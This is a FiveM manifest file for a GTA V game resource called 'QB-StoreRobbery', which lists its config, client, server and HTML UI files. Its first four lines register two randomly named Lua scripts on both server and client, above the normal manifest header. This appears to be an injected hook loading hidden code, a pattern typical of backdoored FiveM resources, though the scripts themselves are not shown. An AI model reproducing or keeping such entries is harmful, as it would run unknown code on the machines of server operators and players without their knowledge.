server_script "GTAS7C3AOM64H5P.lua"
client_script "GTAS7C3AOM64H5P.lua"
server_script "R33UCUIZPA.lua"
client_script "R33UCUIZPA.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-StoreRobbery'
version '1.0.0'

ui_page 'html/index.html'

shared_scripts {'config.lua', 	'@ox_lib/init.lua',}
client_script 'client/main.lua'
server_script 'server/main.lua'

files {
    'html/index.html',
    'html/script.js',
    'html/style.css',
    'html/reset.css'
}

lua54 'yes'